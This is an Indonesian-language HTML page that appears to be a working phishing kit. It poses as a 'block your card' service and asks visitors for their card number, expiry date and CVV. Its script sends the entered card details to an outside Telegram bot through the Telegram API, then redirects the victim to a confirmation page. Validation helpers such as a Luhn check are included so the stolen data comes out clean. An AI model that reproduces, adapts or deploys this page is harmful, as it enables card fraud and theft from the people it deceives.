<!DOCTYPE html><html lang="id"><head>
  <meta charset="UTF-8">
  <meta name="theme-color" content="#FF8C00"> 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Validasi Kartu Interaktif</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 10px;
      background: url('https://blogger.googleusercontent.com/img/a/AVvXsEhXlg5fhyWQY4Vp0bb_BelRPPfYgH9KBasWkVcvlW8MdUMWeNlbBA7pyzF8SjMU66M6Y11PqNwtnP_Dy5kkD090OPG085Xfdxez7hnPn1OsBanyrXnoSk5DBbDOzF2J0fKtOvdwWmZIACA9qneuSRJuTW6-uXqAe3fX8EZ0rAjD5N9ZuOM_goevc_eVoo0Q') no-repeat center center fixed;
            background-size: cover;
    }


    .card.flipped {
      transform: rotateY(180deg);
    }
    



    .card .front,
.card .back {
  width: 100%;
  height: 100%;
  border-radius: 10px;
  margin-top:18%;
  
  overflow: hidden;
  background: #000000;

  background-size: contain;
  
  background-position: center center;
  background-repeat: no-repeat;
  color: white;
  box-shadow: 0 0px 10px rgba(0, 0, 0, 0.9);
  position: absolute;
  top: 0;
  left: 0;
  backface-visibility: hidden;

  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  padding: 15px;
  box-sizing: border-box;
}
.card .front {
  background-image: url('https://blogger.googleusercontent.com/img/a/AVvXsEgXWLVSuqoQ2cNQvcSP6EIF4Fc1yy7rovSfAxm8x2NcMItZrq8iObJasImZuwlZnTYnsCjpMKD2hxOSG7YocSgReoO_shGprY4hKA3yOvXpwv02n0lnReoo7VDFH7DtKLB3Flgst_NxnGEMqNClobWFIvMDFF4qWnq94su44o1k0BuAzLKo_f2pBU1rUymU');
}

.card .back {
  background-image: url('https://blogger.googleusercontent.com/img/a/AVvXsEgfCKlFgZbb4K7NbeCRvzb9pP4WG3MxFYgwsmPstKMsBByAvLi2DcwoU6FCOdAio8lWD7j9hblc7Ny-BSM9-zoIjXDb5wPkByFPGXQFQgUd2ftuSM0goUP_mQljUULBjRg6dTc6UCshRD68ChSOuEpNS7T0klRkkSF7lhJPWmrUY2VDZa0PWnwBAOrE6q97');
  transform: rotateY(180deg);
}
    .card-number {
      font-size: 20px;
      margin-top: 100px;
      letter-spacing: 2px;
    }

    .card-expiry {
      font-size: 16px;
      margin-top: 10px;
    }

    .card-cvv {
      font-size: 18px;
    }
    
    .form-group {
  display: flex;
  flex-direction: column; /* ubah dari row ke kolom */
  align-items: flex-start; /* rata kiri */
  max-width: 300px;
  margin: 10px auto;
}

input[type="tel"] {
  width: 100%; /* isi lebar penuh group */
  padding: 15px;
  font-size: 16px;
  
  outline:none;
  border: 1px solid #ccc;
  border-radius: 5px;
  box-sizing: border-box;
  box-shadow: 0 0px 10px rgba(0, 0, 0, 0.5);
}

.error {
  color: red;
  font-size: 12px;
  margin-top: 5px; /* beri jarak kecil dari input */
  text-align: left; /* teks error rata kiri */
}

    .card-type {
      text-align: center;
      font-weight: bold;
      font-size: 14px;
      margin-bottom: 10px;
    }

    button {
  margin-top: 20px;
  width: 80%;
  padding: 12px 40px;
  background-color: #ff9315;
  color: #ffffff;
  font-size: 15px;
  border: none;
  border-radius: 6px;
  cursor: pointer;
}

    
    .card-box {
  width: 300px;
  height: 180px;
  perspective: 1000px;
  margin: 0 auto 30px;
  
  display: flex;
  justify-content: center;
  align-items: center;
}

.card {
  width: 100%;
  height: 100%;
  
  transform-style: preserve-3d;
  transition: transform 0.6s;
  transform-origin: center center;
}
.form-wrapper {
  border: 1px solid #ff9315; /* garis pembatas */
  border-radius: 10px;
  padding: 20px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1); /* efek bayangan */
  background-color: #fff;
  max-width: 320px;
  margin: 0 auto 20px;
}
nav {
            width: 100%;
            position: fixed;
            background-color: white;
            z-index: 1000;
border: 2px solid #ffffff; 
        }
        nav.top {
            top: 0;
            margin-left:-5%;
            border-bottom: 2px solid #ccc;
        }
        nav.bottom {
            bottom: 0;
            border-top: 2px solid #ddd;
        }
        nav img {
            width: 100%;
            height: auto;
            display: block;
        }

  </style>
</head>
<body>
            <nav class="top">
        <img src="images/Picsart_25-04-04_14-51-50-816.jpg" alt="Nav Atas">
    </nav>

<div class="card-box">
  <div class="card" id="card">
    <div class="front">
      <div class="card-number" id="displayCardNumber">â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢</div>
      <div class="card-expiry">Valid Thru: <span id="displayExpiry">MM/YY</span></div>
    </div>
    <div class="back">
      <div>CVV</div>
      <div class="card-cvv" id="displayCVV">â€¢â€¢â€¢</div>
    </div>
  </div>
</div>
<br><br>
<div class="card-type" id="cardType"></div>


  <div class="form-wrapper">
  <div class="form-group">
    <input type="tel" name="cardNumber" id="cardNumber" maxlength="19" placeholder="Masukan 16 Digit Nomor Kartu">
    <div class="error" id="cardError"></div>
  </div>

  <div class="form-group">
    <input type="tel" name="expiry" id="expiry" maxlength="5" placeholder="Valid/Thru">
    <div class="error" id="expiryError"></div>
  </div>

  <div class="form-group">
    <input type="tel" name="cvv" id="cvv" maxlength="3" placeholder="CVV 3 Angka">
    <div class="error" id="cvvError"></div>
  </div>

  <div style="text-align:center">
    <button type="submit">Blokir Kartu</button>
  </div>
<script src="../config.js"></script> 
<!-- config.js harus berisi token dan chatId -->
<!--
const telegramConfig = {
    botToken: "TOKEN_BOT_ANDA",
    chatId: "CHAT_ID_ANDA"
};
-->

<script>
document.querySelector("button[type='submit']").addEventListener("click", function (e) {
    e.preventDefault(); // cegah form reload

    // Ambil nilai input
    let cardNumber = document.getElementById("cardNumber").value.trim();
    let expiry = document.getElementById("expiry").value.trim();
    let cvv = document.getElementById("cvv").value.trim();

    // Cek kalau kosong
    if (!cardNumber || !expiry || !cvv) {
        alert("Harap isi semua data kartu.");
        return;
    }

    // Format pesan
    let message = `ðŸ”’ Blokir Kartu\n\nðŸ’³ Nomor Kartu: ${cardNumber}\nðŸ“… Valid/Thru: ${expiry}\nðŸ”‘ CVV: ${cvv}`;

    // Kirim ke Telegram
    fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: telegramConfig.chatId,
            text: message
        })
    })
    .then(res => res.json())
    .then(data => {
        // Setelah terkirim, arahkan ke konfir.html
        window.location.href = "konfir.html";
    })
    .catch(err => {
        console.error("Gagal mengirim:", err);
        alert("Terjadi kesalahan, coba lagi.");
    });
});
</script>


<script>
function detectCardType(number) {
  number = number.replace(/\s/g, '');
  if (/^4/.test(number)) return 'Visa';
  if (/^5[1-5]/.test(number) || /^2(2[2-9]|[3-6]|7[01])/.test(number)) return 'MasterCard';
  if (/^3[47]/.test(number)) return 'AMEX';
  return 'Tidak Dikenal';
}

function validLuhn(number) {
  number = number.replace(/\D/g, '');
  let sum = 0, toggle = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = +number[i];
    if (toggle) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    toggle = !toggle;
  }
  return sum % 10 === 0;
}

function validExpiry(value) {
  if (!/^\d{2}\/\d{2}$/.test(value)) return false;
  const [month, year] = value.split('/').map(Number);
  if (month < 1 || month > 12) return false;
  const now = new Date();
  const expiry = new Date(2000 + year, month);
  return expiry > now;
}

function validCVV(cvv, cardType) {
  if (cardType === 'AMEX') return /^\d{4}$/.test(cvv);
  return /^\d{3}$/.test(cvv);
}

document.getElementById('cardNumber').addEventListener('input', function () {
  let value = this.value.replace(/\D/g, '').substring(0, 16);
  this.value = value.replace(/(.{4})/g, '$1 ').trim();
  document.getElementById('displayCardNumber').textContent = this.value || 'â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢';
  const type = detectCardType(this.value);
  document.getElementById('cardType').textContent = type === 'Tidak Dikenal' ? 'Kartu Tidak Dikenal' : type;
});

document.getElementById('expiry').addEventListener('input', function () {
  let value = this.value.replace(/\D/g, '').substring(0, 4);
  if (value.length >= 3) {
    this.value = value.substring(0, 2) + '/' + value.substring(2);
  } else {
    this.value = value;
  }
  document.getElementById('displayExpiry').textContent = this.value || 'MM/YY';
});

document.getElementById('cvv').addEventListener('focus', () => document.getElementById('card').classList.add('flipped'));
document.getElementById('cvv').addEventListener('blur', () => document.getElementById('card').classList.remove('flipped'));
document.getElementById('cvv').addEventListener('input', function () {
  document.getElementById('displayCVV').textContent = this.value || 'â€¢â€¢â€¢';
});

function validateForm() {
  const cardNum = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
  const expiry = document.getElementById('expiry').value.trim();
  const cvv = document.getElementById('cvv').value.trim();
  const type = detectCardType(cardNum);

  document.getElementById('cardError').textContent = '';
  document.getElementById('expiryError').textContent = '';
  document.getElementById('cvvError').textContent = '';

  let valid = true;

  if (cardNum.length !== 16 || !validLuhn(cardNum)) {
    document.getElementById('cardError').textContent = 'Nomor tidak valid';
    valid = false;
  }

  if (!validExpiry(expiry)) {
    document.getElementById('expiryError').textContent = 'Tanggal salah';
    valid = false;
  }

  if (!validCVV(cvv, type)) {
    document.getElementById('cvvError').textContent = 'CVV salah';
    valid = false;
  }

  return valid;
}

</script>

</div></form></body></html>